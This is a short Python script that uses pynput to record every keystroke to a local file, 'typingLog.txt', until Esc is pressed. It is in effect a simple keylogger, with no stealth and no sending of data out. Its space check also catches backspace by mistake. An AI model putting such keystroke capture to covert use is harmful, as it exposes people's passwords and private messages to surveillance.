import pynput

from pynput.keyboard import Key, Listener
count = 0
keys = []
# This function is called when a key is pressed
def on_press(key) :
    global keys, count
    keys.append(key)
    count += 1

    # After every 2 keys is pressed update the file
    if count >= 2:
        count = 0
        write_file(keys)
        keys = []

# This function to write the keys to the file
def write_file(keys):
    with open("typingLog.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("backspace") > 0:
                file.write("")
            elif k.find("enter") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


# This function is called when esc key is pressed to break the loop 
def on_release(key) :
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
